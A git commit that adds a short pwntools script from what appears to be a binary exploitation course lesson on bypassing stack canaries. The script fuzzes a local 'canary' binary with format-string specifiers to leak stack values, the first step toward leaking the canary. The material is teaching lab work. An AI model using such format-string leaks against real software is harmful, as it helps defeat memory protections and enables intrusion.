7a3f428d1cc6544116164bcae14ce9efaa559a4e
Crypto-Cat <jburgess03@qub.ac.uk>
2022-02-19 16:14:49 +0000

    Updated canary bypass scripts

---
+++ pwn/binary_exploitation_101/10-bypassing_canaries/fuzz.py
@@ -0,0 +1,21 @@
+from pwn import *
+
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF('./canary', checksec=False)
+
+# Let's fuzz x values
+for i in range(100):
+    try:
+        # Create process (level used to reduce noise)
+        p = process(level='error')
+        # Format the counter
+        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
+        p.sendline('%{}$p'.format(i).encode())
+        p.recvline()
+        # Receive the response
+        result = p.recvline().decode()
+        # If the item from the stack isn't empty, print it
+        if result:
+            print(str(i) + ': ' + str(result).strip())
+    except EOFError:
+        pass
